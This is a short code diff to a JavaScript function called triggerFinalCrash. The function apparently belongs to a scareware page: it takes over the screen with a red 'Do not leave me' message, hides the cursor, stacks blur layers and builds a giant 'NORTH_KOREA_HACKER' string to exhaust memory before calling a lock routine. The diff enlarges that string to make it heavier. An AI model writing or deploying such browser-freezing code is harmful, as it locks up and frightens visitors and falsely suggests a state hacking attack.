@@ -130,7 +130,7 @@ function triggerFinalCrash() {
     
     document.body.innerHTML = `
         <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
-            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 40px red; margin:0;">나를 떠나지 마십시오.</h1>
+            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 40px red; margin:0;">나를 떠나지 마십시오.</h1>
             <p style="font-size:2vw; color:white; opacity:1;"></p>
         </div>
     `;
@@ -158,7 +158,7 @@ function triggerFinalCrash() {
             const layer = document.createElement('div');
             layer.style.cssText = `position:fixed; top:0; left:0; width:1vw; height:1vw; backdrop-filter:blur(50px); z-index:10;`;
             document.getElementById('death-screen').appendChild(layer);
-            const heavy = new Array(500000).fill("NORTH_KOREA_HACKER").join("!!");
+            const heavy = new Array(600000).fill("NORTH_KOREA_HACKER").join("!!");
             JSON.stringify(heavy);
             setTimeout(absoluteLock, 0);
         }
